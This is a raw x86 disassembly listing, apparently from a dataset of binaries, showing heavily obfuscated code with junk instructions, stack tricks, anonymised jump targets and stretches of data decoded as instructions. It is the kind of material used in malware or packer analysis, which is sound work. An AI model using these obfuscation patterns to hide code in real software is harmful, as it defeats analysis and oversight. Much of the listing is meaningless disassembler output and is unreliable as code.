jge rwxdata
jmp rwxdata
ja rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
call sub_101d968a
call sub_101d2d5a
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
sub_101d227e
lea esp [ esp + 0x2c ]
call j_sub_101cb5d7
jg rwxdata
call sub_101d2d5a
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
pushfd
pushfd
push 0x3eff6ec6
lea esp [ esp + 0xc ]
jae rwxdata
jmp rwxdata
dec bl
jmp rwxdata
pushad
push 0xa328d711
sets al
lodsb [ esi ]
test esp 0xa12c1eb7
pushfd
lea esp [ esp + 0x28 ]
jb rwxdata
pushfd
mov bl 0x2
pushfd
dec al
mov al 0x29
inc ecx
mov [ esp + 0x4 ] bl
not al
mov al 0x10
lea esp [ esp + 0x8 ]
jmp rwxdata
jmp rwxdata
sub al 0xf8
jmp rwxdata
call j_sub_101cb5d7
pushad
mov [ esp ] 0x66bd
adc al al
call sub_101d869e
jns rwxdata
pushfd
sub al 0xf8
jmp j_sub_101d8cff
call sub_101be43e
inc ecx
push esi
dec ecx
inc ebx
inc ecx
push eax
xor esi [ edx ]
insb
insb
add cl ch
xor al 0x68
cmc
[ ebp + ecx * 4 + 0x56cd504 ]
sbb [ esi + 0xf ] ebx
popfd
les ecx [ ebp + 0x1d749005 ]
adc al ch
xchg ebx eax
loope rwxdata
test al 0xed
pop esi
mov al [ 0x529e876 ]
scasb [ edi ]
sbb al [ ebp - 0x46da829f ]
push esp
stosb [ edi ]
mov ebx 0x242030ee
sbb eax 0x4db14a5a
lds edi [ edx - 0x48 ]
lea edi [ bx + si - 0x1a ]
mov eax 0xb20dd9c6
pop eax
xchg ebx edi
retn
shr [ esi - 0x64 ] 0x1
bound esi [ ebx - 0x19 ]
mov eax 0x95a97fde
mov bl 0x6d
mov dl 0x73
imul ebp ebx 0x73
retn
add al bh
adc [ esi ] ch
sub_101d27c7
cwde
setns ah
pushfd
mov [ edi - 0x1 ] 0x0
bswap ax
lea eax [ ebx * 4 - 0x505995c5 ]
mov [ esp + 0x4 ] ebx
lahf
mov [ esp ] dl
cwde
bswap ax
lea eax [ rwxdata ]
pushfd
mov [ esp + 0x4 ] rwxdata
push [ esp ]
push 0xe60f5130
jmp rwxdata
mov [ esp + 0x8 ] eax
push ecx
push [ esp + 0xc ]
retn 0x10
sub_101d2802
jmp rwxdata
or eax eax
call sub_101d1d5d
and eax 0x77873fe0
dec ebx
jae rwxdata
clc
add edi eax
call sub_101d3d95
sbb [ 0x28f9ced7 ] esp
and [ ebx + edx - 0x74 ] ch
xor eax [ ebx + ebx + 0x3f ]
pop edi
mov al [ 0x4b7f209f ]
sar [ ebx ] cl
jecxz rwxdata
xchg edi ebx
pushad
push ecx
mov esi [ esp + 0x24 ]
movzx bx dl
jmp sub_101d83a2
das
sub [ edi + 0x20 ] dl
aas
das
sub_101d2d5a
pushad
lea esp [ esp + 0x24 ]
jae rwxdata
jmp rwxdata
call sub_101d8d0e
lahf
inc ecx
mov ebp 0x5b909d5
pop ecx
cwde
pushad
push 0xa328d711
sets al
lodsb [ esi ]
test esp 0xa12c1eb7
pushfd
lea esp [ esp + 0x28 ]
jb rwxdata
jmp rwxdata
sub al 0xf8
jmp rwxdata
pushfd
sub al 0xf8
jmp j_sub_101d8cff
call sub_101be43e
inc ecx
push esi
dec ecx
inc ebx
inc ecx
push eax
xor esi [ edx ]
insb
insb
add cl ch
xor al 0x68
cmc
[ ebp + ecx * 4 + 0x56cd504 ]
sbb [ esi + 0xf ] ebx
popfd
les ecx [ ebp + 0x1d749005 ]
adc al ch
xchg ebx eax
loope rwxdata
shr [ esi - 0x64 ] 0x1
bound esi [ ebx - 0x19 ]
mov eax 0x95a97fde
mov bl 0x6d
mov dl 0x73
imul ebp ebx 0x73
retn
add al bh
adc [ esi ] ch
sub_101d2e40
pushfd
pushad
pushfd
mov [ esp + 0x28 ] rwxdata
jmp rwxdata
jmp rwxdata
push edi
push esp
mov [ esp + 0x2c ] eax
push ebp
push [ esp + 0x4 ]
push [ esp + 0x34 ]
retn 0x38
sub_101d2ff5
push 0x211a57fe
pushfd
lea esp [ esp + 0x18 ]
je rwxdata
lea esi [ 0xffffffffc081b206 ]
pop esi
movzx di al
xchg di bx
pop edi
mov ch 0x31
pushfd
mov ebx [ esp + 0x4 ]
not cx
pushad
bswap cx
movzx cx cl
mov ecx [ esp + 0x28 ]
push 0x3aa792c6
mov esp ebp
bswap ebp
call sub_101bc9c8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
rcl bx 0x7
add [ ebp - 0x4 ] ecx
mov di 0x8be8
sub ecx 0x8
bt si 0xb
neg di
shr ecx 0x1
adc bx 0x9df0
mov edi [ esi ]
btr bx 0x1
add edi [ ebp + 0x10 ]
bsf bx bx
add esi 0x8
and bh 0xdd
mov bx [ esi ]
cmp dh ch
call sub_101c7f76
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ eax * 8 + 0x76abfba ]
mov eax [ edx + 0x8 ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
push esp
jmp rwxdata
pushfd
call sub_101d91e6
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_101d3634
pushad
push ebx
lea esp [ esp + 0x28 ]
jae rwxdata
jge rwxdata
xchg bh cl
mov ebx eax
not di
pushfd
not di
mov edi eax
bswap cx
pushfd
movsx cx cl
mov ecx 0x104
push 0xb1e6dfb0
push 0x619aaf67
mov [ esp + 0xc ] 0x60
lea esp [ esp + 0x10 ]
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
cmp si ax
clc
xor al al
jmp sub_101d03b0
sub_101d3819
call sub_101be2dd
sub [ ebx + 0x2f9bc4b3 ] 0x1a600ef
dec ecx
call 0x727db78e
pop esp
sub al 0x42
push 0x78c66c12
mov dl ah
ror [ ebx + edi * 2 ] cl
movsd [ edi ] [ esi ]
jns rwxdata
mov dh 0xa8
imul [ eax - 0x730d77e9 ]
mov [ 0xb90757c ] eax
je rwxdata
pushad
jmp rwxdata
inc edx
sub_101d3a71
pushad
add edx eax
pushfd
mov [ esp ] 0xf9
lea esp [ esp + 0x30 ]
jmp rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_101d3d2b
neg dx
mov [ esp + 0x4 ] esi
test sp bp
mov edx [ ebp + 0x8 ]
movsx si cl
mov esi [ ebp + 0xc ]
sar ch cl
movsx cx al
dec ch
bswap cx
mov ecx [ ebp + 0x14 ]
sub esp 0xfffffffc
jae rwxdata
test dl 0xee
bt ax 0xb
or edx edx
pushfd
mov [ esp ] si
lea esp [ esp + 0x4 ]
je rwxdata
test ah 0xd0
pushfd
pushad
or edx edx
call sub_101b8282
add [ eax ] al
arpl [ ecx + 0x70 ] sp
inc ebx
jb rwxdata
lea esi [ 0xffffffffc081b206 ]
pop esi
movzx di al
xchg di bx
pop edi
mov ch 0x31
pushfd
mov ebx [ esp + 0x4 ]
not cx
pushad
bswap cx
movzx cx cl
mov ecx [ esp + 0x28 ]
push 0x3aa792c6
mov esp ebp
bswap ebp
call sub_101bc9c8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
call sub_101c578b
inc esi
mov [ esp + 0x4 ] ch
inc edi
pushad
mov [ esp + 0x10 ] si
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_101d8396
add al 0xbb
iretd
popad
je rwxdata
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
push es
mov eax 0x310d42c9
xchg bh bh
inc esi
clc
dec esp
movsd [ edi ] [ esi ]
mov ecx 0x9281bd11
xlat
xchg [ edi + eax * 8 + 0x1c ] esp
mov esp 0x8cd21ffc
cmpsd [ esi ] [ edi ]
pushfd
inc eax
nop
loope rwxdata
inc ebx
popad
jo rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ eax * 8 + 0x76abfba ]
mov eax [ edx + 0x8 ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
cli
or eax 0x58f2cdd2
inc esi
cmp [ esi + 0x5ae56ef1 ] al
and edx ebx
dec ebp
test al 0x26
fld [ edx + esi * 8 + 0x51 ]
cli
inc edx
mov ebp 0x8bbc064f
sar [ eax - 0x29 ] cl
not [ edx - 0x375caaac ]
mov dh 0xe5
0xfa64f213 0xd20d
int 0xf2
pop eax
jne rwxdata
push esp
jmp rwxdata
pushfd
call sub_101d91e6
push edi
imul ebp [ esi + 0x64 ] 0x41776f
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
sub_101d3d95
clc
pushfd
mov edi [ edi + ecx * 4 ]
clc
cmc
add esp 0xc
jle rwxdata
cmc
test edi edi
pushad
pushfd
jmp rwxdata
test edi edi
push 0xf8817d45
mov [ esp ] dh
lea esp [ esp + 0x4 ]
je rwxdata
jmp rwxdata
bts dx 0x2
xor eax eax
call sub_101d723d
xlat
push edx
in eax dx
inc edx
fucom st5
fldl2e
jpo rwxdata
lea esp [ esp + 0x24 ]
je rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub esp 0xfffffffc
jae rwxdata
scasd [ edi ]
adc eax 0x1f2a3533
fild [ ebx + edi * 4 ]
pushfd
jmp rwxdata
test dl 0xee
bt ax 0xb
or edx edx
pushfd
mov [ esp ] si
lea esp [ esp + 0x4 ]
je rwxdata
test ah 0xd0
pushfd
pushad
or edx edx
call sub_101b8282
add [ eax ] al
arpl [ ecx + 0x70 ] sp
inc ebx
jb rwxdata
add eax edi
push [ esp ]
cmp eax edx
mov [ esp + 0x4 ] 0x4b
lea esp [ esp + 0x8 ]
jb rwxdata
lea esi [ 0xffffffffc081b206 ]
pop esi
movzx di al
xchg di bx
pop edi
mov ch 0x31
pushfd
mov ebx [ esp + 0x4 ]
not cx
pushad
bswap cx
movzx cx cl
mov ecx [ esp + 0x28 ]
push 0x3aa792c6
mov esp ebp
bswap ebp
call sub_101bc9c8
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
call sub_101c578b
inc esi
mov [ esp + 0x4 ] ch
inc edi
pushad
mov [ esp + 0x10 ] si
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_101d8396
iretd
add al 0xbb
popad
je rwxdata
jge rwxdata
stc
pushad
cmc
test al ah
cmp eax [ ebp - 0x10 ]
pushad
lea esp [ esp + 0x40 ]
jae rwxdata
pushfd
cmp dh ah
mov [ esp ] al
push esp
add ecx 0xffffffff
pushfd
lea esp [ esp + 0xc ]
je rwxdata
jmp rwxdata
push es
mov eax 0x310d42c9
xchg bh bh
inc esi
clc
dec esp
movsd [ edi ] [ esi ]
mov ecx 0x9281bd11
xlat
xchg [ edi + eax * 8 + 0x1c ] esp
mov esp 0x8cd21ffc
cmpsd [ esi ] [ edi ]
pushfd
inc eax
nop
loope rwxdata
inc ebx
popad
jo rwxdata
pushad
not di
setg cl
mov ebx eax
bswap di
pushfd
movsx cx bl
jmp rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
cmp dl bl
cmc
stc
add edx 0x11c
push ebp
pushad
pushfd
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
lea eax [ eax * 8 + 0x76abfba ]
mov eax [ edx + 0x8 ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
cli
or eax 0x58f2cdd2
inc esi
cmp [ esi + 0x5ae56ef1 ] al
and edx ebx
dec ebp
test al 0x26
fld [ edx + esi * 8 + 0x51 ]
cli
inc edx
mov ebp 0x8bbc064f
sar [ eax - 0x29 ] cl
not [ edx - 0x375caaac ]
mov dh 0xe5
0xfa64f213 0xd20d
int 0xf2
pop eax
jne rwxdata
mov edi eax
jmp rwxdata
push esp
jmp rwxdata
pushfd
call sub_101d91e6
push edi
imul ebp [ esi + 0x64 ] 0x41776f
mov ecx 0x104
mov [ esp + 0x4 ] 0xf3
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
xchg si di
movzx esi [ edx + 0x1a ]
push [ esp ]
lea esi [ esi + edx + 0x1c ]
movsx di dl
push [ esp + 0x4 ]
mov di 0x7f34
mov edi [ ebp + 0x8 ]
jmp sub_101bdb2a
cmp si ax
clc
xor al al
jmp sub_101d03b0
sub_101d410a
lea esp [ esp + 0x44 ]
ja rwxdata
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
sbb al ah
test edx edi
setg al
sub ebx edi
rcl di cl
adc di 0x5f76
mov al 0xe
pushfd
sub esp 0xfffffffc
add ebx esp
cmc
mov edi ebx
shl al 0x2
mov al 0x2e
push ecx
cmc
[ edi ]
mov [ esp ] 0x51
lea esp [ esp + 0x4 ]
jne rwxdata
pushfd
call sub_101be1d9
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
pushfd
setge al
sete ah
call sub_1020cbcc
bts dx 0x2
xor eax eax
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101d4159
shr eax 0x10
sar cx cl
call sub_101cb500
and [ ebx + 0x3ce2e896 ] edi
dec ebp
fadd [ ebx - 0x358d37ac ]
jle rwxdata
sub esp 0xfffffffc
add ebx esp
cmc
mov edi ebx
shl al 0x2
mov al 0x2e
push ecx
cmc
[ edi ]
mov [ esp ] 0x51
lea esp [ esp + 0x4 ]
jne rwxdata
or ebx ebx
add ebx [ eax - 0x28c49c19 ]
xchg [ esi ] esp
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
pushfd
setge al
sete ah
call sub_1020cbcc
bts dx 0x2
xor eax eax
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101d49bd
push 0x3814da11
jmp rwxdata
lea esp [ esp + 0x8 ]
jne rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
setb al
lahf
mov [ edi - 0x1 ] 0x0
cwde
lea eax [ ecx - 0x6eda5b04 ]
bswap ax
push ebx
bswap ax
cwde
lea eax [ rwxdata ]
pushad
push ebx
pushad
mov [ esp + 0x4 ] 0x90407234
mov [ esp + 0x40 ] rwxdata
pushfd
mov [ esp ] cl
mov [ esp + 0x40 ] eax
pushfd
pushfd
mov [ esp ] 0xb957
push [ esp + 0x48 ]
retn 0x4c
bts dx 0x2
xor eax eax
jge rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101d5154
pushfd
lea esp [ esp + 0x2c ]
jae rwxdata
jmp rwxdata
jmp rwxdata
call j_sub_101cb5d7
pushad
mov [ esp ] 0x66bd
adc al al
call sub_101d869e
jns rwxdata
call sub_101c8d1d
add [ eax ] al
push eax
popad
je rwxdata
test al 0xed
pop esi
mov al [ 0x529e876 ]
scasb [ edi ]
sbb al [ ebp - 0x46da829f ]
push esp
stosb [ edi ]
mov ebx 0x242030ee
sbb eax 0x4db14a5a
lds edi [ edx - 0x48 ]
lea edi [ bx + si - 0x1a ]
mov eax 0xb20dd9c6
pop eax
xchg ebx edi
retn
sahf
dec ebp
popad
je rwxdata
daa
push 0x63657053
inc ecx
add [ ebx ] bl
sahf
and [ eax ] ebp
salc
jge rwxdata
add esi [ esi ]
fdivr [ edi ]
in eax 0x63
sub [ esi - 0x65 ] edx
push 0xffffffc5
pop edx
mov [ edx - 0x44 ] ss
sub_101d52bb
call j_sub_101cee15
add [ eax ] al
inc esp
jae rwxdata
add [ ebp - 0x7b ] ah
sbb al 0x0
jb rwxdata
add dl al
pop ebx
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
mov ecx 0x1d81
add [ eax ] al
add al al
aam 0x1b
add [ eax ] al
add [ eax ] al
add [ ecx + 0x1d4d ] bh
and [ eax ] al
add [ eax ] al
add [ eax ] al
jb __import_lookup_table_17(KERNEL32:GetModuleHandleA)
add [ eax ] al
add [ eax ] al
shl ebx cl
sbb eax [ eax ]
add [ eax ] al
add [ eax ] al
test [ gs : eax + eax ] ebx
jns rwxdata
mov [ ebp - 0x236effe0 ] bl
sbb eax [ eax ]
xchg ebx eax
mov ecx 0xa36b0020
sbb al 0x0
jb rwxdata
sbb eax 0x0
add [ eax - 0x76 ] bh
sbb eax [ eax ]
add [ eax ] al
add [ eax ] al
bound edi [ 0x1d ]
add [ eax ] al
pop edi
mov ebx [ eax + eax ]
add [ eax ] al
add [ eax ] al
rcl [ edx + 0x1d ] 0x0
add [ eax ] al
add [ eax ] al
shl [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ edx - 0x7f ] ch
sbb al 0x0
add [ eax ] al
add [ eax ] al
mov [ esp ] esi
call sub_101c0187
outsb
jbe rwxdata
jmp rwxdata
sbb eax 0x1c060d00
add [ eax ] al
add [ eax ] al
add [ edx - 0x73 ] dl
and al 0x8
call sub_1020c707
push ebx
lea esp [ esp + 0x4 ]
jmp rwxdata
add [ eax ] al
add [ eax ] al
jb rwxdata
jo rwxdata
clc
movsx ax al
mov eax ebp
neg bl
mov bl 0x1
pushfd
jmp rwxdata
add [ eax ] al
add [ eax ] al
or al [ eax ]
add [ eax ] al
sub esp ecx
sbb eax [ eax ]
add [ eax ] al
add [ eax ] al
lea eax [ ebx + 0x1b ]
add [ eax ] al
jl rwxdata
add [ eax ] al
add [ eax ] al
add bl dl
sbb eax [ eax ]
outsb
insd
outsb
je __import_lookup_table_0(KERNEL32:GetVersionExA)
lds edi [ esp + 0x6496972c ]
les esi [ ebx - 0x29fbfe54 ]
test eax 0x5a2495aa
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
xchg ebx eax
xchg ebx eax
sbb al 0x0
retn 0x115b
insb
outsd
arpl [ ebx ] bp
sub_101d53bf
push edx
lea esp [ esp + 0x8 ]
call sub_1020c707
push ebx
lea esp [ esp + 0x4 ]
jmp rwxdata
clc
movsx ax al
mov eax ebp
neg bl
mov bl 0x1
pushfd
jmp rwxdata
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
sub_101d54bd
push 0xd83b20f2
lea esp [ esp + 0xc ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
cmc
push esp
push eax
imul edx edx 0xa
cmc
add edx eax
push 0xe6b23f20
pushad
mov [ esp ] 0xa2d0
pushfd
lea esp [ esp + 0x30 ]
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
stc
imul edx edx 0xa
jmp rwxdata
jmp rwxdata
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_101d5b22
bt ax 0xb
rol al 0x7
mov [ esp ] dh
pushfd
pushfd
not al
mov [ esp + 0x4 ] bh
mov [ esp ] 0xcc92
neg al
test ah bh
cmp al [ edi ]
lahf
cwde
lea edi [ edi + 0x1 ]
cwde
movsx ax al
lea esp [ esp + 0x30 ]
jo rwxdata
bswap ax
lahf
jmp rwxdata
lea eax [ ecx - 0x721b61de ]
pop eax
jmp rwxdata
not al
pop eax
pushfd
lea esp [ esp + 0x4 ]
ja rwxdata
jmp rwxdata
cmp al al
cmp ecx [ ebp - 0x4 ]
pushfd
pushfd
lea esp [ esp + 0x8 ]
jae rwxdata
pushfd
call sub_101d6678
push ecx
lea esp [ esp + 0x4 ]
ja rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
call sub_101bfc89
mov [ esp ] 0xce67ca94
push ebp
lea esp [ esp + 0x4 ]
jg rwxdata
jmp sub_101d52bb
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
call j_sub_101d1f12
pushfd
mov [ esp ] 0x19fc7f78
pushfd
pushfd
lea esp [ esp + 0x8 ]
jmp j_sub_1020f431
sub_101d6491
bt bx sp
test bh 0xc3
pushfd
[ edi ]
mov [ esp + 0x4 ] dh
lea esp [ esp + 0x28 ]
jne rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
lea eax [ eax * 4 - 0x5b5517e6 ]
movzx ax al
bswap eax
mov [ edi - 0x1 ] 0x0
movsx eax dl
pushad
mov [ esp + 0x1c ] ebx
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
pushfd
lea eax [ edx * 8 + 0x5e19056c ]
setge ah
lea eax [ rwxdata ]
call sub_1020d330
clc
adc [ esi ] ch
shr [ esi - 0x64 ] 0x1
bound esi [ ebx - 0x19 ]
mov eax 0x95a97fde
mov bl 0x6d
mov dl 0x73
imul ebp ebx 0x73
retn
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101d6678
lea esp [ esp + 0x8 ]
jb rwxdata
clc
cmc
pushfd
cmp ecx [ ebp - 0x8 ]
pushfd
lea esp [ esp + 0x8 ]
jbe rwxdata
cmp bl 0x4b
test bh 0x52
cmp [ edi - 0x1 ] 0x0
pushad
pushad
call sub_101c6893
bts dx 0x2
xor eax eax
jge rwxdata
sbb di bx
shld di bx 0x5
sbb si 0x7d95
inc si
sub ecx 0x1
xor di 0xafff
sbb di cx
bsr si ax
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
mov [ ebp - 0x4 ] ecx
inc esi
xchg cx di
mov ecx [ ebp - 0x8 ]
bt di 0x1
clc
shl di cl
rcr si 0x4
add ecx [ ebp - 0x4 ]
rol si 0x3
bts esi ecx
adc di ax
shr ecx 0x1
shl si cl
mov edi [ ebx + ecx * 4 ]
lea esi [ ebp * 8 - 0x260f86e7 ]
add edi eax
lea esi [ ebp * 8 - 0x6b10bcf9 ]
jmp rwxdata
jmp sub_101d52df
sub_101d6a53
mov [ esp + 0x24 ] eax
pushad
mov [ esp ] bh
lodsb [ esi ]
call sub_101cf82f
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
jmp sub_101cf4a6
pushad
pushfd
pushfd
pushfd
push [ esp + 0x2c ]
retn 0x30
sub_101d714b
and al 0x89
shl eax cl
push ebp
ror al cl
or bp 0x29fa
mov ebp esp
or al 0x5f
neg ah
test ch 0x4f
sub esp 0x18
shrd eax eax 0x1a
push esi
sar al 0x6
aas
movsx ax dl
push edi
btc ax 0xe
not ax
push ebx
movzx eax al
xor ax di
mov eax 0xeddb3ba8
jmp rwxdata
push edx
shrd ax cx cl
aam 0xb3
sub ax bp
mov eax [ ebp + 0x8 ]
call sub_101d1613
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
call sub_101d968a
call sub_101d2d5a
cmp dh 0xab
xchg [ esp ] esi
pushad
